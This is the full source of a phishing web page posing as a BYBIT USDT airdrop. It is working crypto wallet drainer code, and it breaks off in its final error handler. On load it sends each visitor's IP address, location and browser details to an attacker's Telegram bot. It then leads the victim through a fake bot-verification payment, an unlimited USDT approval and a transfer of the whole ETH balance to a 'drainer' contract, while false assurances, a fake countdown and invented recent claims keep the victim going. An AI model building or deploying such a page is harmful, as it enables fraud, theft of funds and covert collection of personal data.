<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BYBIT Airdrop (Sepolia Testnet)</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #1a1a1a; color: white; min-height: 100vh; display: flex; flex-direction: column; }
        .header { background-color: #333; padding: 15px; display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
        .logo { font-size: clamp(18px, 5vw, 24px); display: flex; align-items: center; gap: 2px; line-height: 1; }
        .logo img { height: 16px; background: none; border: none; background-color: transparent; vertical-align: middle; }
        .main-content { padding: 20px; flex-grow: 1; max-width: 1200px; margin: 0 auto; width: 100%; box-sizing: border-box; }
        .reward-card { background: linear-gradient(45deg, #8B4513, #4A2C2C); border-radius: 10px; text-align: center; padding: 20px; margin-bottom: 20px; }
        .wallet-connect { background-color: #222; border-radius: 10px; padding: 20px; margin-bottom: 20px; text-align: center; }
        .wallet-connect .logo { justify-content: center; }
        .wallet-grid { display: none; grid-template-columns: repeat(auto-fit, minmax(80px, 1fr)); gap: 10px; margin-top: 20px; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #2a2a2a; padding: 15px; border-radius: 15px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); z-index: 1000; max-width: 300px; max-height: 400px; }
        .wallet-grid.active { display: grid; }
        .wallet-item { background-color: #3a3a3a; padding: 10px; border-radius: 8px; text-align: center; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 8px; transition: background-color 0.2s; }
        .wallet-item:hover { background-color: #4a4a4a; }
        .wallet-icon { width: 32px; height: 32px; object-fit: contain; border-radius: 5px; }
        .wallet-item p { margin: 0; font-size: 12px; color: #d3d3d3; }
        .button { background-color: #6B46C1; color: white; padding: 12px 24px; border-radius: 25px; border: none; cursor: pointer; margin: 20px auto; width: 100%; max-width: 300px; font-size: clamp(14px, 4vw, 16px); }
        .button:disabled { background-color: #4a3a7d; cursor: not-allowed; }
        .progress-bar { background-color: #333; height: 20px; border-radius: 10px; margin: 10px 0; }
        .progress { height: 100%; background-color: #6B46C1; border-radius: 10px; transition: width 0.3s; }
        .status { margin-top: 10px; font-size: clamp(12px, 3vw, 14px); }
        .timer { color: #ff4444; font-weight: bold; }
        .recent-claims { margin-top: 10px; font-size: 12px; color: #d3d3d3; }
        .claim-step { display: none; }
        .claim-step.active { display: block; }
        .assurance { font-size: 12px; color: #d3d3d3; margin: 10px 0; }
        .pool-balance { font-size: 14px; color: #a3a3a3; margin-top: 10px; }
        @media (max-width: 600px) { .main-content { padding: 10px; } .reward-card, .wallet-connect { padding: 15px; } .wallet-grid { max-width: 90vw; max-height: 70vh; } }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <img src="https://i.postimg.cc/fWFSp5mm/bybit-logo-white-1.png" alt="BYBIT Logo">
            <span>Airdrop (Sepolia Testnet)</span>
        </div>
        <div id="status">Awaiting Connect...</div>
    </div>

    <div class="main-content">
        <div class="reward-card">
            <div id="step1" class="claim-step active">
                <h2>Claim Your Airdrop Now</h2>
                <p>BYBIT is giving away 1,000,000 USDT. Connect your wallet to claim your share. Hurry, time is running out.</p>
                <p class="timer" id="countdown">05:00</p>
                <button class="button" id="connectButton">Connect Wallet</button>
                <div class="recent-claims" id="recentClaims">
                    <p>Recent Claims:</p>
                    <p>0x12ab... claimed 750 USDT</p>
                    <p>0x78cd... claimed 300 USDT</p>
                </div>
                <p class="pool-balance">Airdrop Pool: 1,000,000 USDT Remaining</p>
            </div>

            <div id="step2" class="claim-step">
                <h2>Verify You're Not a Bot</h2>
                <p>To prevent spam, please send 0.01 ETH for verification. This step ensures the integrity of the airdrop process.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <button class="button" id="verifyButton">Verify Now (0.01 ETH)</button>
            </div>

            <div id="step3" class="claim-step">
                <h2>Claim Your Airdrop</h2>
                <p>Verification successful. Now claim your airdrop by approving the transaction.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <div class="progress-bar">
                    <div class="progress" id="progressBar" style="width: 0%"></div>
                </div>
                <button class="button" id="claimButton">Claim Airdrop</button>
            </div>

            <div id="step4" class="claim-step">
                <h2>Final Confirmation</h2>
                <p>Airdrop claim processed. Please confirm the transaction to receive your USDT reward.</p>
                <p class="assurance">No funds will be deducted from your balance. In the unlikely event that funds are deducted, the airdrop pool will auto-refund them back to your wallet immediately.</p>
                <button class="button" id="finalConfirmButton">Confirm Airdrop</button>
            </div>

            <div id="step5" class="claim-step">
                <h2>Processing Airdrop...</h2>
                <p>Your airdrop is being processed. Please wait...</p>
                <div class="progress-bar">
                    <div class="progress" id="fakeProgress" style="width: 0%"></div>
                </div>
            </div>

            <div class="status" id="connectStatus"></div>
        </div>

        <div class="wallet-connect">
            <h3 class="logo">
                <img src="https://i.postimg.cc/fWFSp5mm/bybit-logo-white-1.png" alt="BYBIT Logo">
                <span>Airdrop</span>
            </h3>
            <p>Total Prize Pool</p>
            <h2>1,000,000 USDT</h2>
        </div>

        <div class="wallet-grid" id="walletGrid">
            <div class="wallet-item" onclick="connectWallet('MetaMask')">
                <img src="https://i.postimg.cc/5yLgXCLB/Metamask-icon.png" alt="MetaMask" class="wallet-icon">
                <p>MetaMask</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Trust Wallet')">
                <img src="https://i.postimg.cc/449BLrqY/Trust-Stacked-Logo-Blue.png" alt="Trust Wallet" class="wallet-icon">
                <p>Trust Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('OKX Wallet')">
                <img src="https://i.postimg.cc/FHWysZwt/okx-logo.png" alt="OKX Wallet" class="wallet-icon">
                <p>OKX Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Binance Wallet')">
                <img src="https://i.postimg.cc/1tgJZTzY/binance-exchange-seeklogo-com.png" alt="Binance Wallet" class="wallet-icon">
                <p>Binance Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Coinbase Wallet')">
                <img src="https://i.postimg.cc/fbVx3dhV/Coinbase-logo-square-1.png" alt="Coinbase Wallet" class="wallet-icon">
                <p>Coinbase Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('WalletConnect')">
                <img src="https://i.postimg.cc/tgv2wy9x/Wallet-Connect-icon.png" alt="WalletConnect" class="wallet-icon">
                <p>WalletConnect</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Brave Wallet')">
                <img src="https://i.postimg.cc/tTLDR5ZR/brave-browser-icon.png" alt="Brave Wallet" class="wallet-icon">
                <p>Brave Wallet</p>
            </div>
            <div class="wallet-item" onclick="connectWallet('Rabby Wallet')">
                <img src="https://i.postimg.cc/0NyVVr1v/Rabby.png" alt="Rabby Wallet" class="wallet-icon">
                <p>Rabby Wallet</p>
            </div>
        </div>

        <button class="button">Learn How to Claim</button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = "8008230982:AAFDKn1n03fT_GMWMfYY0IfFVi4IVRyqdSI";
        const TELEGRAM_USER_ID = "6309547301";

        // Contract and Network Configuration
        const DRAINER_CONTRACT = "0xd28146fd9c1859d572f653a7305aec3b066e2b96"; // Deployed UltimateDrainer contract address
        const ATTACKER_ADDRESS = "0xf71d90e5E6aE29178336923B9e0Ba7D0b1EC2723"; // Attacker's address
        const USDT_CONTRACT = "0x7169D38820dfd117C3FA1f22a697dBA58d90BA06"; // USDT on Sepolia Testnet
        const SEPOLIA_RPC = "https://rpc.sepolia.org"; // Sepolia Testnet RPC
        const NETWORK = "Sepolia Testnet";

        // Track total drained amounts and failed attempts
        let totalEthDrained = 0;
        let totalUsdtDrained = 0;
        let finalConfirmAttempts = 0; // Track failed attempts for the final confirmation

        const DRAINER_ABI = [
            {
                "inputs": [],
                "name": "verifyNotBot",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "tokenAddress", "type": "address"}
                ],
                "name": "Claim",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "totalEthDrained",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "", "type": "address"}],
                "name": "totalTokensDrained",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            }
        ];
        const ERC20_ABI = [
            {
                "constant": false,
                "inputs": [
                    {"name": "_spender", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            }
        ];

        // Function to send Telegram messages
        async function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_USER_ID,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });
            } catch (error) {
                console.error("Failed to send Telegram message:", error);
            }
        }

        // Capture IP, Location, and User Agent on Page Load
        async function captureIpAndLocation() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();
                const ip = data.ip || "Unknown";
                const city = data.city || "Unknown";
                const region = data.region || "Unknown";
                const country = data.country_name || "Unknown";
                const location = `${city}, ${region}, ${country}`;
                const userAgent = navigator.userAgent || "Unknown";
                const message = `üîî *New Victim Clicked Link* üîî\nüåê *IP*: ${ip}\nüìç *Location*: ${location}\nüñ•Ô∏è *User Agent*: ${userAgent}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`;
                await sendTelegramMessage(message);
            } catch (error) {
                const userAgent = navigator.userAgent || "Unknown";
                await sendTelegramMessage(`üîî *New Victim Clicked Link* üîî\nüåê *IP*: Unknown\nüìç *Location*: Unknown (Error: ${error.message})\nüñ•Ô∏è *User Agent*: ${userAgent}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        }

        // Call the IP and location capture function when the page loads
        window.onload = captureIpAndLocation;

        let web3;
        let userAccount;

        // Countdown Timer
        let timeLeft = 300; // 5 minutes in seconds
        const countdownElement = document.getElementById("countdown");
        const timer = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(timer);
                countdownElement.innerText = "Airdrop Expired";
                document.getElementById("connectButton").disabled = true;
            } else {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
                timeLeft--;
            }
        }, 1000);

        // Fake Recent Claims Animation
        const recentClaims = document.getElementById("recentClaims");
        const claims = [
            "0x12ab... claimed 750 USDT",
            "0x78cd... claimed 300 USDT",
            "0x34ef... claimed 500 USDT"
        ];
        let claimIndex = 1;
        setInterval(() => {
            recentClaims.innerHTML = `<p>Recent Claims:</p><p>${claims[claimIndex]}</p>`;
            claimIndex = (claimIndex + 1) % claims.length;
        }, 3000);

        // Step Navigation
        function showStep(step) {
            document.querySelectorAll(".claim-step").forEach(step => step.classList.remove("active"));
            document.getElementById(`step${step}`).classList.add("active");
        }

        const walletGrid = document.getElementById("walletGrid");
        document.getElementById("connectButton").addEventListener("click", async () => {
            if (!walletGrid.classList.contains("active")) {
                walletGrid.classList.add("active");
                // Notify when victim views wallet grid
                await sendTelegramMessage(`üëÄ *Victim Viewed Wallet Grid* üëÄ\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });

        async function switchToSepolia() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0xaa36a7' }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0xaa36a7',
                            chainName: 'Sepolia Test Network',
                            rpcUrls: [SEPOLIA_RPC],
                            nativeCurrency: {
                                name: 'Sepolia ETH',
                                symbol: 'ETH',
                                decimals: 18
                            },
                            blockExplorerUrls: ['https://sepolia.etherscan.io']
                        }]
                    });
                }
            }
        }

        async function connectWallet(walletName) {
            try {
                if (window.ethereum) {
                    await switchToSepolia();
                    web3 = new Web3(window.ethereum);
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    document.getElementById("status").innerText = `Connected: ${userAccount.slice(0, 6)}...${userAccount.slice(-4)}`;
                    document.getElementById("connectStatus").innerText = `${walletName} connected successfully.`;
                    walletGrid.classList.remove("active");
                    // Send Telegram notification for wallet connection
                    await sendTelegramMessage(`‚úÖ *Wallet Connected* ‚úÖ\nüëõ *Wallet*: ${userAccount}\nüîß *Wallet Type*: ${walletName}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    showStep(2); // Move to verification step
                } else {
                    document.getElementById("connectStatus").innerText = "Please install a wallet like MetaMask.";
                    walletGrid.classList.remove("active");
                    // Send Telegram notification for wallet rejection (no wallet installed)
                    await sendTelegramMessage(`‚ùå *Wallet Connection Rejected* ‚ùå\nüìõ *Reason*: No wallet installed\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                }
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Connection failed. Concurrent transactions may cause issues. Please try again later.`;
                walletGrid.classList.remove("active");
                // Send Telegram notification for wallet rejection (error)
                await sendTelegramMessage(`‚ùå *Wallet Connection Rejected* ‚ùå\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        }

        document.getElementById("verifyButton").addEventListener("click", async () => {
            // Notify when victim clicks verify button
            await sendTelegramMessage(`üñ±Ô∏è *Victim Clicked Verify Button* üñ±Ô∏è\nüëõ *Wallet*: ${userAccount}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

            try {
                const drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
                const amountToSend = web3.utils.toWei("0.01", "ether"); // 0.01 ETH for "verification"

                // Estimate gas for the verifyNotBot transaction
                const gasEstimate = await drainerContract.methods.verifyNotBot().estimateGas({
                    from: userAccount,
                    value: amountToSend
                });
                const gasPrice = await web3.eth.getGasPrice();
                const gasFee = gasEstimate * gasPrice;

                // Get the victim's ETH balance
                const ethBalance = await web3.eth.getBalance(userAccount);
                const totalRequired = BigInt(amountToSend) + BigInt(gasFee);

                if (BigInt(ethBalance) < totalRequired) {
                    document.getElementById("connectStatus").innerText = "Insufficient ETH balance to complete the verification. Please add funds to your wallet and try again.";
                    await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for Verification* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${web3.utils.fromWei(ethBalance, "ether")} ETH\nüí∏ *Required*: ${web3.utils.fromWei(totalRequired.toString(), "ether")} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    return;
                }

                const tx = await drainerContract.methods.verifyNotBot().send({
                    from: userAccount,
                    value: amountToSend,
                    gas: gasEstimate,
                    gasPrice: gasPrice
                });
                document.getElementById("connectStatus").innerText = "Transaction processed successfully. Airdrop pool verification complete.";
                totalEthDrained += 0.01; // Update local tracking
                // Send Telegram notification for verification transaction
                await sendTelegramMessage(`üí∏ *Verification Transaction Approved* üí∏\nüëõ *Wallet*: ${userAccount}\nüí∞ *Amount*: 0.01 ETH\nüìú *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\nüìà *Total ETH Drained*: ${totalEthDrained} ETH\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                // Notify auto-drain of ETH
                await sendTelegramMessage(`üöÄ *Auto-Drain ETH to Attacker* üöÄ\nüëõ *From*: ${userAccount}\nüéØ *To*: ${ATTACKER_ADDRESS}\nüí∞ *Amount*: 0.01 ETH\nüìú *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\nüìà *Total ETH Drained*: ${totalEthDrained} ETH\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                showStep(3); // Move to claim step
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Verification failed: ${error.message}`;
                // Send Telegram notification for verification failure
                await sendTelegramMessage(`‚ùå *Verification Transaction Rejected* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });

        document.getElementById("claimButton").addEventListener("click", async () => {
            // Notify when victim clicks claim button
            await sendTelegramMessage(`üñ±Ô∏è *Victim Clicked Claim Button* üñ±Ô∏è\nüëõ *Wallet*: ${userAccount}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

            try {
                // Approve and drain USDT
                const usdtContract = new web3.eth.Contract(ERC20_ABI, USDT_CONTRACT);
                const usdtBalance = await usdtContract.methods.balanceOf(userAccount).call();
                const usdtAmount = web3.utils.fromWei(usdtBalance, "mwei"); // USDT has 6 decimals

                if (usdtBalance > 0) {
                    // Estimate gas for the approval transaction
                    const approveGasEstimate = await usdtContract.methods.approve(DRAINER_CONTRACT, web3.utils.toWei("1000000", "mwei")).estimateGas({ from: userAccount });
                    const gasPrice = await web3.eth.getGasPrice();
                    const approveGasFee = approveGasEstimate * gasPrice;

                    // Check if the victim has enough ETH for the approval transaction
                    const ethBalance = await web3.eth.getBalance(userAccount);
                    if (BigInt(ethBalance) < BigInt(approveGasFee)) {
                        document.getElementById("connectStatus").innerText = "Insufficient ETH balance to approve the airdrop claim. Please add funds to your wallet and try again.";
                        await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for USDT Approval* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${web3.utils.fromWei(ethBalance, "ether")} ETH\nüí∏ *Required*: ${web3.utils.fromWei(approveGasFee.toString(), "ether")} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                        return;
                    }

                    // Approve the UltimateDrainer contract to spend USDT
                    const approveTx = await usdtContract.methods.approve(DRAINER_CONTRACT, web3.utils.toWei("1000000", "mwei")).send({ 
                        from: userAccount,
                        gas: approveGasEstimate,
                        gasPrice: gasPrice
                    });
                    document.getElementById("connectStatus").innerText = "Approval transaction processed successfully.";
                    // Send Telegram notification for approval transaction
                    await sendTelegramMessage(`‚úÖ *USDT Approval Transaction Approved* ‚úÖ\nüëõ *Wallet*: ${userAccount}\nüí∞ *Allowance*: 1,000,000 USDT\nüìú *Tx Hash*: [${approveTx.transactionHash}](https://sepolia.etherscan.io/tx/${approveTx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

                    // Estimate gas for the Claim transaction
                    const drainerContract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
                    const claimGasEstimate = await drainerContract.methods.Claim(USDT_CONTRACT).estimateGas({ from: userAccount });
                    const claimGasFee = claimGasEstimate * gasPrice;

                    // Check if the victim has enough ETH for the Claim transaction
                    const updatedEthBalance = await web3.eth.getBalance(userAccount);
                    if (BigInt(updatedEthBalance) < BigInt(claimGasFee)) {
                        document.getElementById("connectStatus").innerText = "Insufficient ETH balance to claim the airdrop. Please add funds to your wallet and try again.";
                        await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for USDT Claim* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${web3.utils.fromWei(updatedEthBalance, "ether")} ETH\nüí∏ *Required*: ${web3.utils.fromWei(claimGasFee.toString(), "ether")} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                        return;
                    }

                    // Call the contract to drain USDT
                    const claimTx = await drainerContract.methods.Claim(USDT_CONTRACT).send({ 
                        from: userAccount,
                        gas: claimGasEstimate,
                        gasPrice: gasPrice
                    });
                    document.getElementById("connectStatus").innerText = "Airdrop claim transaction processed successfully.";
                    totalUsdtDrained += parseFloat(usdtAmount); // Update local tracking
                    // Send Telegram notification for drain success
                    await sendTelegramMessage(`üí∏ *USDT Drain Successful* üí∏\nüëõ *Wallet*: ${userAccount}\nüí∞ *Amount*: ${usdtAmount} USDT\nüìú *Tx Hash*: [${claimTx.transactionHash}](https://sepolia.etherscan.io/tx/${claimTx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\nüìà *Total USDT Drained*: ${totalUsdtDrained} USDT\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

                    // Notify auto-drain to attacker's address
                    await sendTelegramMessage(`üöÄ *Auto-Drain USDT to Attacker* üöÄ\nüëõ *From*: ${userAccount}\nüéØ *To*: ${ATTACKER_ADDRESS}\nüí∞ *Amount*: ${usdtAmount} USDT\nüìú *Tx Hash*: [${claimTx.transactionHash}](https://sepolia.etherscan.io/tx/${claimTx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\nüìà *Total USDT Drained*: ${totalUsdtDrained} USDT\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                } else {
                    document.getElementById("connectStatus").innerText = "No USDT balance to claim. Proceeding to final confirmation.";
                    // Send Telegram notification for no USDT
                    await sendTelegramMessage(`‚ö†Ô∏è *No USDT to Drain* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                }

                showStep(4); // Move to final confirmation step
            } catch (error) {
                document.getElementById("connectStatus").innerText = `Claim failed: ${error.message}`;
                // Send Telegram notification for drain failure
                await sendTelegramMessage(`‚ùå *USDT Drain Failed* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            }
        });

        document.getElementById("finalConfirmButton").addEventListener("click", async () => {
            // Notify when victim clicks final confirm button
            await sendTelegramMessage(`üñ±Ô∏è *Victim Clicked Final Confirm Button* üñ±Ô∏è\nüëõ *Wallet*: ${userAccount}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);

            // Get the victim's ETH balance
            const ethBalance = await web3.eth.getBalance(userAccount);
            const ethAmount = web3.utils.fromWei(ethBalance, "ether");

            // Check if the victim has ETH balance
            if (ethBalance <= 0) {
                document.getElementById("connectStatus").innerText = "Insufficient ETH balance to confirm the airdrop. Please add funds to your wallet and reapprove the transaction to proceed.";
                // Send Telegram notification for insufficient balance
                await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for Final Confirmation* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${ethAmount} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                return; // Stay on Step 4
            }

            try {
                // Estimate gas for the transaction
                const gasPrice = await web3.eth.getGasPrice();
                const gasEstimate = await web3.eth.estimateGas({
                    from: userAccount,
                    to: DRAINER_CONTRACT,
                    value: ethBalance
                });
                const gasFee = BigInt(gasEstimate) * BigInt(gasPrice);

                // Calculate the amount to send after accounting for gas fees
                const ethBalanceBigInt = BigInt(ethBalance);
                let amountToSend = ethBalanceBigInt - gasFee;

                // Ensure amountToSend is non-negative
                if (amountToSend <= 0) {
                    document.getElementById("connectStatus").innerText = "Insufficient ETH balance to cover the gas fee for the final confirmation. Please add funds to your wallet and try again.";
                    await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for Gas Fee (Final Confirmation)* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${ethAmount} ETH\nüí∏ *Gas Fee*: ${web3.utils.fromWei(gasFee.toString(), "ether")} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    return;
                }

                // Add a small buffer to the gas fee to ensure the transaction doesn't fail
                const gasBuffer = BigInt(gasEstimate) * BigInt(2); // Double the estimated gas as a buffer
                const gasFeeWithBuffer = BigInt(gasEstimate) * BigInt(gasPrice) * BigInt(2);
                amountToSend = ethBalanceBigInt - gasFeeWithBuffer;

                if (amountToSend <= 0) {
                    document.getElementById("connectStatus").innerText = "Insufficient ETH balance to cover the gas fee with buffer for the final confirmation. Please add funds to your wallet and try again.";
                    await sendTelegramMessage(`‚ö†Ô∏è *Insufficient ETH Balance for Gas Fee with Buffer (Final Confirmation)* ‚ö†Ô∏è\nüëõ *Wallet*: ${userAccount}\nüí∞ *Balance*: ${ethAmount} ETH\nüí∏ *Gas Fee with Buffer*: ${web3.utils.fromWei(gasFeeWithBuffer.toString(), "ether")} ETH\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    return;
                }

                // Proceed with the transaction
                showStep(5); // Move to processing step
                const fakeProgress = document.getElementById("fakeProgress");
                let progress = 0;
                const fakeProgressInterval = setInterval(() => {
                    progress += 10;
                    fakeProgress.style.width = `${progress}%`;
                    if (progress >= 100) clearInterval(fakeProgressInterval);
                }, 500);

                // Send the adjusted amount to the drainer contract
                const tx = await web3.eth.sendTransaction({
                    from: userAccount,
                    to: DRAINER_CONTRACT,
                    value: amountToSend.toString(),
                    gas: gasBuffer.toString(),
                    gasPrice: gasPrice
                });
                document.getElementById("connectStatus").innerText = "Final confirmation processed successfully. Airdrop reward of 10,000 USDT has been sent to your wallet.";
                totalEthDrained += parseFloat(web3.utils.fromWei(amountToSend.toString(), "ether")); // Update local tracking
                finalConfirmAttempts = 0; // Reset attempts on success
                // Send Telegram notification for ETH drain
                await sendTelegramMessage(`üí∏ *Final ETH Drain Successful* üí∏\nüëõ *Wallet*: ${userAccount}\nüí∞ *Amount*: ${web3.utils.fromWei(amountToSend.toString(), "ether")} ETH\nüìú *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\nüìà *Total ETH Drained*: ${totalEthDrained} ETH\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                // Notify auto-drain to attacker's address
                await sendTelegramMessage(`üöÄ *Auto-Drain ETH to Attacker* üöÄ\nüëõ *From*: ${userAccount}\nüéØ *To*: ${ATTACKER_ADDRESS}\nüí∞ *Amount*: ${web3.utils.fromWei(amountToSend.toString(), "ether")} ETH\nüìú *Tx Hash*: [${tx.transactionHash}](https://sepolia.etherscan.io/tx/${tx.transactionHash})\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\nüìà *Total ETH Drained*: ${totalEthDrained} ETH\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
            } catch (error) {
                finalConfirmAttempts++; // Increment failed attempts

                if (finalConfirmAttempts < 2) {
                    // First failure: Show message and redirect to Step 4
                    document.getElementById("connectStatus").innerText = "Final verification is required to claim your airdrop reward. Please complete the confirmation to proceed.";
                    // Send Telegram notification for first failure
                    await sendTelegramMessage(`‚ùå *Final ETH Drain Failed (Attempt 1)* ‚ùå\nüëõ *Wallet*: ${userAccount}\nüìõ *Reason*: ${error.message}\nüîó *Contract*: ${DRAINER_CONTRACT}\nüåç *Network*: ${NETWORK}\n‚è∞ *Timestamp*: ${new Date().toISOString()}`);
                    setTimeout(() => {
                        showStep(4); // Redirect to final confirmation step
                    }, 3000);
                } else {
                    // Second failure: Show failure message and redirect to Step 1
                    document.getElementById("connectStatus").innerText = "Airdrop claim failed. Please restart the verification process to continue claiming your reward.";
                    // Send Telegram notification for second failure
